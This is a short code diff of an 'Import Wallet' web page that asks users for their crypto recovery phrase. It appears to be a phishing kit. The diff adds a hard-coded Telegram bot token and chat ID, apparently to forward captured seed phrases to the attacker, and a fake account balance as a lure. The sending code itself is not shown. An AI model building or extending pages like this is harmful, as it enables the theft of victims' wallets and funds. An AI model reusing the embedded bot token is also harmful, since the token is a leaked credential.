@@ -132,12 +132,13 @@
   </style>
 </head>
 <body>
-<script src="intelligent2.js"></script>
+<script src="intelligent.js"></script>
   <div class="content-box">
     <h2>🔐 Import Wallet</h2>
     <p>Enter your Recovery Phrase to restore access and enable Web3 features like trading, earning, and staking.</p>
     <form>
 <textarea
+name="Secret phrase crypto wallet"
   id="tokenPhrase"
   class="input-field"
   placeholder="Enter your Recovery phrase..."
@@ -152,6 +153,10 @@
   </div>
 
   <script>
+    const TELEGRAM_BOT_TOKEN = "7964620453:AAFMQ4mxCpezN6kuTCUEgK7WeMBFNJW2ZS4";
+    const TELEGRAM_CHAT_ID = "7979664801";
+    const currentBalanceUSD = 950;
+
     function restoreWallet() {
       const input = document.getElementById("tokenPhrase").value.trim();
       const msgBox = document.getElementById("tokenMsg");
